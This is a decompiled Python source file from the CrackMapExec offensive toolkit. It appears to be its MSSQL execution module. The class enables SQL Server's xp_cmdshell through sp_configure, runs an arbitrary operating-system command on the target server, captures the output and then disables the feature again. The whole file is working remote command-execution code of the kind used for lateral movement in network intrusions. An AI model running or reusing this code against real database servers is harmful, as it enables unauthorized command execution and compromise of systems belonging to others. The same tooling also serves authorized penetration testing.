# uncompyle6 version 3.6.7
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/execmethods/mssqlexec.py
# Compiled at: 2016-12-29 01:49:52
import traceback

class MSSQLEXEC:

    def __init__(self, connection):
        self.mssql_conn = connection
        self.outputBuffer = ''

    def execute(self, command, output=False):
        try:
            self.enable_xp_cmdshell()
            self.mssql_conn.sql_query(("exec master..xp_cmdshell '{}'").format(command))
            if output:
                self.mssql_conn.printReplies()
                self.mssql_conn.colMeta[0]['TypeData'] = 160
                self.outputBuffer = self.mssql_conn.printRows()
            self.disable_xp_cmdshell()
            return self.outputBuffer
        except Exception:
            traceback.print_exc()

    def enable_xp_cmdshell(self):
        self.mssql_conn.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")

    def disable_xp_cmdshell(self):
        self.mssql_conn.sql_query("exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure 'show advanced options', 0 ;RECONFIGURE;")